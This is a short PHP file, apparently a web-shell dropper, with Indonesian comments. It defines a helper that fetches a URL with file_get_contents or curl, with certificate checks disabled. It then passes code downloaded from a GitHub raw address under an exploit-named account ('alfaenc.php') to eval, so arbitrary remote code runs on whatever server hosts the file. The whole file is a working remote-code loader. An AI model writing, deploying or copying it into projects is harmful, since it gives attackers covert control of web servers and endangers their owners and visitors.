<?php


function getBacklink($url) {
    
    if( ini_get('allow_url_fopen') == 1 ) {
        // Jika url fopen on maka jalankan
        return file_get_contents($url);
    }else if(function_exists('curl_version')) {
        //Jika url fopen off maka jalankan menggunakan curl
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
}


eval("?>" . getBacklink("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/alfaenc.php"));

?>
